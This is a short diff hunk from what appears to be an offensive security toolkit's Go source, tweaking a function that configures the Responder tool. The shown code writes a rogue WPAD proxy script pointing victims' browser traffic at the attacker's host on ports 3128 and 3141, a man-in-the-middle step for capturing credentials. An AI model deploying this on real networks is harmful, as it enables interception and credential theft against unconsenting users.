@@ -566,17 +566,15 @@ func PacketSniffer(Mode string, RHost string) {
 }
 
 func KillerResponder(IFace string, LHost string) {
-
     menus.PrintSelected(menus.PrintOptions{
         IFACE:    IFace,
         LHOST:    LHost,
-    }, true, true)
+    }, true, false)
 
     filePath := "/root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana"
 
     if _, err := os.Stat(filePath); os.IsNotExist(err) {
         subprocess.Popen(`cp /root/.afr3/africana-base/networks/responder/Responder.conf /root/.afr3/africana-base/networks/responder/Responder.conf.bak_africana`)
-
         newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, LHost, LHost)
         filesToReplacements := map[string]map[string]string{
             "/root/.afr3/africana-base/networks/responder/Responder.conf": {
